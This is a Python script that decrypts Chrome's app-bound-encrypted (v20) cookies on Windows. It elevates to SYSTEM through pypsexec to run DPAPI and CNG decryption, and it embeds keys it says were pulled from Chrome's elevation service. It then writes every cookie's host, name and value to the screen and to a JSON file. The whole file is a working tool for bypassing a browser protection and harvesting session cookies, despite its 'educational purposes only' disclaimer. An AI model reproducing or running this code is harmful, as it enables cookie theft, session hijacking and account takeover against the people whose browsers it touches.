"""
Decrypt Chrome v20 cookies with app-bound protection.
Works with Chrome 127+ (flags 0x01, 0x02, 0x03) (newest + oldest versions)
Made by: sh1r0ko11
Usage: whatever you want, but please give credit if you use this code.
License: MIT

this script is intended for educational purposes only. Use at your own risk.
"""
import os
import io
import sys
import json
import shutil
import struct
import ctypes
import base64
import binascii
import sqlite3
import pathlib
import tempfile
from pypsexec.client import Client
from Crypto.Cipher import AES, ChaCha20_Poly1305

# hardcodet keys extracted from elevation_service.exe (for flag 0x01, 0x02, 0x03)
AES_KEY_V1 = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
CHACHA20_KEY_V2 = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
XOR_KEY_V3 = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")


def run_script_via_psexec(script_content: str, use_system_account: bool = True) -> bytes:
    """
    Write script_content to a temp .py file and execute it via pypsexec.
    Returns stdout as bytes.
    """
    fd, script_path = tempfile.mkstemp(suffix='.py', prefix='chrome_decrypt_')
    try:
        os.write(fd, script_content.encode('utf-8'))
        os.close(fd)

        c = Client("localhost")
        c.connect()
        try:
            c.create_service()
            stdout, stderr, rc = c.run_executable(
                sys.executable,
                arguments=f'"{script_path}"',
                use_system_account=use_system_account
            )
            if rc != 0:
                err = stderr.decode(errors='ignore').strip() or "(no stderr)"
                raise Exception(f"pypsexec failed (rc={rc}): {err}")
            return stdout
        finally:
            c.remove_service()
            c.disconnect()
    finally:
        try:
            os.unlink(script_path)
        except Exception:
            pass


def run_dpapi_via_psexec(encrypted_data_b64: str, use_system_account: bool = True) -> bytes:
    """
    Run DPAPI decryption via pypsexec.
    Returns decrypted data as bytes.
    """
    script = f'''import win32crypt, binascii, sys
data = binascii.a2b_base64("{encrypted_data_b64}")
dec = win32crypt.CryptUnprotectData(data, None, None, None, 0)
sys.stdout.buffer.write(binascii.b2a_base64(dec[1]))
'''
    stdout = run_script_via_psexec(script, use_system_account=use_system_account)
    dec_b64 = stdout.decode().strip()
    return base64.b64decode(dec_b64)


def decrypt_with_cng_via_psexec(encrypted_key_b64: str) -> bytes:
    """
    Decrypt the 32-byte AES key using CNG (NCryptDecrypt) via pypsexec as SYSTEM
    The "Google Chromekey1" key in the Microsoft Software Key Storage Provider
    is used for decryption
    Returns the decrypted 32byte AES key.
    """
    script = f'''import ctypes, binascii, sys
ncrypt = ctypes.windll.ncrypt
input_data = binascii.a2b_base64("{encrypted_key_b64}")

hProvider = ctypes.c_void_p(0)
status = ncrypt.NCryptOpenStorageProvider(ctypes.byref(hProvider), 'Microsoft Software Key Storage Provider', 0)
assert status == 0, f'NCryptOpenStorageProvider failed: {{status}}'

hKey = ctypes.c_void_p(0)
status = ncrypt.NCryptOpenKey(hProvider, ctypes.byref(hKey), 'Google Chromekey1', 0, 0)
assert status == 0, f'NCryptOpenKey failed: {{status}}'

pcbResult = ctypes.c_ulong(0)
input_buf = (ctypes.c_ubyte * len(input_data)).from_buffer_copy(input_data)
status = ncrypt.NCryptDecrypt(hKey, input_buf, len(input_buf), None, None, 0, ctypes.byref(pcbResult), 0x40)
assert status == 0, f'1st NCryptDecrypt failed: {{status}}'

out_buf = (ctypes.c_ubyte * pcbResult.value)()
status = ncrypt.NCryptDecrypt(hKey, input_buf, len(input_buf), None, out_buf, pcbResult.value, ctypes.byref(pcbResult), 0x40)
assert status == 0, f'2nd NCryptDecrypt failed: {{status}}'

ncrypt.NCryptFreeObject(hKey)
ncrypt.NCryptFreeObject(hProvider)
sys.stdout.buffer.write(bytes(out_buf[:pcbResult.value]))
'''
    stdout = run_script_via_psexec(script, use_system_account=True)
    return stdout


def parse_key_blob(blob_data: bytes) -> dict:
    """
    Parse the decrypted key blob which has a length-prefixed structure:
    [4 bytes: header_len][header bytes][4 bytes: content_len][flag][...cipher-specific data...]
    """
    buffer = io.BytesIO(blob_data)
    parsed = {}

    header_len = struct.unpack('<I', buffer.read(4))[0]
    parsed['header'] = buffer.read(header_len)
    content_len = struct.unpack('<I', buffer.read(4))[0]

    if 8 + header_len + content_len != len(blob_data):
        raise ValueError(
            f"Invalid blob: header_len={header_len}, content_len={content_len}, "
            f"expected={8 + header_len + content_len}, got={len(blob_data)}"
        )

    parsed['flag'] = buffer.read(1)[0]

    if parsed['flag'] == 1 or parsed['flag'] == 2:
        #[flag|iv(12)|ciphertext(32)|tag(16)]
        parsed['iv'] = buffer.read(12)
        parsed['ciphertext'] = buffer.read(32)
        parsed['tag'] = buffer.read(16)
    elif parsed['flag'] == 3:
        # [flag|encrypted_aes_key(32)|iv(12)|ciphertext(32)|tag(16)]
        parsed['encrypted_aes_key'] = buffer.read(32)
        parsed['iv'] = buffer.read(12)
        parsed['ciphertext'] = buffer.read(32)
        parsed['tag'] = buffer.read(16)
    else:
        raise ValueError(
            f"Unsupported flag: 0x{parsed['flag']:02x} - "
            f"Chrome version may be newer than supported. "
            f"Please report this flag value to the author (Github repo and newer version will be released)."
        )

    return parsed


def byte_xor(ba1: bytes, ba2: bytes) -> bytes:
    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])


def derive_v20_master_key(parsed_data: dict) -> bytes:
    """
    Derive the master key based on the flag in the decrypted blob.
    """
    flag = parsed_data['flag']

    if flag == 1:
        print(f"[+] Flag 0x01 detected (AES-256-GCM, Chrome ~127-132)")
        cipher = AES.new(AES_KEY_V1, AES.MODE_GCM, nonce=parsed_data['iv'])
        return cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])

    elif flag == 2:
        print(f"[+] Flag 0x02 detected (ChaCha20-Poly1305, Chrome ~133-136)")
        cipher = ChaCha20_Poly1305.new(key=CHACHA20_KEY_V2, nonce=parsed_data['iv'])
        return cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])

    elif flag == 3:
        print(f"[+] Flag 0x03 detected (AES-256-GCM + CNG, Chrome 137+)")
        #Decrypt the AES key using CNG with the Google Chromekey1 from KSP
        encrypted_key_b64 = base64.b64encode(parsed_data['encrypted_aes_key']).decode()
        decrypted_aes_key = decrypt_with_cng_via_psexec(encrypted_key_b64)
        if len(decrypted_aes_key) != 32:
            raise ValueError(f"CNG decrypted key is {len(decrypted_aes_key)} bytes, expected 32")
        #XOR with hardcoded key from elevation_service.exe
        xored_aes_key = byte_xor(decrypted_aes_key, XOR_KEY_V3)
        cipher = AES.new(xored_aes_key, AES.MODE_GCM, nonce=parsed_data['iv'])
        return cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])

    else:
        raise ValueError(f"Unsupported flag: {flag}")


def decrypt_cookie_v20(master_key: bytes, encrypted_value: bytes) -> str:
    """
    Decrypt a single v20 cookie
    Structure: [v20 prefix(3)][iv(12)][ciphertext(variable)][tag(16)]
    The decrypted value has a 32-byte prefix that should be stripped.
    """
    cookie_iv = encrypted_value[3:15]
    encrypted_cookie = encrypted_value[15:-16]
    cookie_tag = encrypted_value[-16:]
    cipher = AES.new(master_key, AES.MODE_GCM, nonce=cookie_iv)
    decrypted = cipher.decrypt_and_verify(encrypted_cookie, cookie_tag)
    return decrypted[32:].decode('utf-8', errors='ignore')


def main():
    user_profile = os.environ['USERPROFILE']
    local_state_path = os.path.join(
        user_profile, "AppData", "Local", "Google", "Chrome", "User Data", "Local State"
    )
    cookie_db_path = os.path.join(
        user_profile, "AppData", "Local", "Google", "Chrome", "User Data",
        "Default", "Network", "Cookies"
    )

    #1 Read Local State
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)

    app_bound_encrypted_key = local_state["os_crypt"]["app_bound_encrypted_key"]
    decoded_prefix = binascii.a2b_base64(app_bound_encrypted_key)[:4]
    if decoded_prefix != b"APPB":
        raise Exception(f"app_bound_encrypted_key does not start with APPB (got {decoded_prefix})")

    #2 Strip APPB prefix and decrypt with SYSTEM DPAPI then user DPAPI
    payload = binascii.a2b_base64(app_bound_encrypted_key)[4:]
    payload_b64 = base64.b64encode(payload).decode()

    print("Decrypting with SYSTEM DPAPI...")
    system_dec = run_dpapi_via_psexec(payload_b64, use_system_account=True)

    print("Decrypting with user DPAPI...")
    user_dec = run_dpapi_via_psexec(base64.b64encode(system_dec).decode(), use_system_account=False)

    #3 parse the key blob (properly handles all flag versions)
    print("Parsing key blob...")
    parsed_data = parse_key_blob(user_dec)
    print(f"Detected flag: 0x{parsed_data['flag']:02x}")

    #4 Derive the master key based on the flag
    decrypted_key = derive_v20_master_key(parsed_data)
    print(f"Master decryption key obtained ({len(decrypted_key)} bytes).")

    #5 Fetch and decrypt v20 cookies (copy DB to temp to avoid Chrome lock)
    cookie_list = []
    with tempfile.TemporaryDirectory() as temp_dir:
        temp_db_path = os.path.join(temp_dir, "Cookies_temp")
        try:
            shutil.copy2(cookie_db_path, temp_db_path)
        except PermissionError:
            print("Warning: Could not copy cookie DB. Trying direct access...")
            temp_db_path = cookie_db_path

        con = sqlite3.connect(pathlib.Path(temp_db_path).as_uri() + "?mode=ro", uri=True)
        cur = con.cursor()
        cur.execute("SELECT host_key, name, CAST(encrypted_value AS BLOB) FROM cookies;")
        rows = cur.fetchall()
        con.close()

        for host, name, enc_val in rows:
            if not enc_val or enc_val[:3] != b"v20":
                continue
            try:
                cookie_value = decrypt_cookie_v20(decrypted_key, enc_val)
                cookie_obj = {
                    "host": host,
                    "name": name,
                    "value": cookie_value
                }
                cookie_list.append(cookie_obj)
                print(f"{host} | {name} | {cookie_value}")
            except Exception as e:
                print(f"Failed to decrypt cookie {host} {name}: {e}")

    #6 Save cookies to JSON file in the same directory as the script
    if cookie_list:
        output_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "chrome_cookies.txt")
        with open(output_path, "w", encoding="utf-8") as out_file:
            json.dump(cookie_list, out_file, indent=2, ensure_ascii=False)
        print(f"[+] Saved {len(cookie_list)} cookies to: {output_path}")
    else:
        print("No v20 cookies found")


if __name__ == "__main__":
    main()
